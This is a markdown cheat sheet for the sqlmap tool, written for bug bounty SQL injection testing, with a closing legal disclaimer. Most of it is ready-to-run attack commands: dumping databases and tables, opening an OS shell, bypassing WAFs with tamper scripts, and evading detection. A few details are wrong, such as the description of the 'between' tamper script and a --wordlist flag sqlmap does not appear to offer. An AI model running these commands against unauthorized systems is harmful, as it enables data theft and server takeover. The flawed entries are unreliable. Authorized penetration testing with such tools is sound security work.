# SQLMap Fast Documentation for Bug Bounty

## Quick Start Cheat Sheet

### Basic Usage
```
sqlmap -u "http://example.com/vuln.php?id=1" --batch --random-agent
```

### Essential Flags
- `-u` or `--url`: Target URL
- `--batch`: Non-interactive mode (auto-selects defaults)
- `--random-agent`: Randomize User-Agent header
- `--level` and `--risk`: Increase for more thorough tests (1-5 and 1-3 respectively)
- `--dbms`: Specify DBMS (MySQL, Oracle, PostgreSQL, etc.)
- `--os`: Specify OS if known

### Common Scenarios

**GET Parameter Testing**
```
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

**POST Parameter Testing**
```
sqlmap -u "http://example.com/login" --data="username=admin&password=pass" --dbs
```

**Custom wordlist**
```sh
sqlmap -u "http://example.com/vuln.php?id=1" --wordlist=/path/to/wordlist.txt
```

**Cookie-Based Testing**
```
sqlmap -u "http://example.com/dashboard" --cookie="PHPSESSID=abc123" --dbs
```

### Data Extraction

**List Databases**
```
sqlmap -u "http://example.com/vuln.php?id=1" --dbs
```

**List Tables in Specific DB**
```
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --tables
```

**Dump Table Data**
```
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --dump
```

**Get OS Shell**
```
sqlmap -u "http://example.com/vuln.php?id=1" --os-shell
```

### Advanced Techniques

**WAF Bypass**
```
sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment --random-agent --delay=1
```

**Common Tamper Scripts**
- `space2comment`: Replaces spaces with comments
- `between`: Replaces BETWEEN with NOT BETWEEN
- `randomcase`: Randomly changes case of characters
- `charencode`: URL-encodes characters

**Threading for Speed**
```
sqlmap -u "http://example.com/vuln.php?id=1" --threads=5
```

### Reporting

**Save Output to File**
```
sqlmap -u "http://example.com/vuln.php?id=1" --output-dir=/path/to/results
```

**Generate HTML Report**
```
sqlmap -u "http://example.com/vuln.php?id=1" --output-dir=/path/to/results --dump-format=HTML
```

## Bug Bounty Pro Tips

1. **Be Ethical**: Only test authorized targets
2. **Rate Limiting**: Use `--delay` to avoid overwhelming servers
3. **Stealth**: Combine `--random-agent`, `--proxy`, and `--time-sec` for stealth
4. **Automation**: Use `--crawl` to automatically find injection points
5. **Second-Order**: Test for stored SQLi with `--second-url`
6. **JSON Injection**: Test API endpoints with `--data` and `--headers="Content-Type: application/json"`

## Legal Disclaimer
Always obtain proper authorization before testing. Unauthorized testing is illegal and against bug bounty program policies.
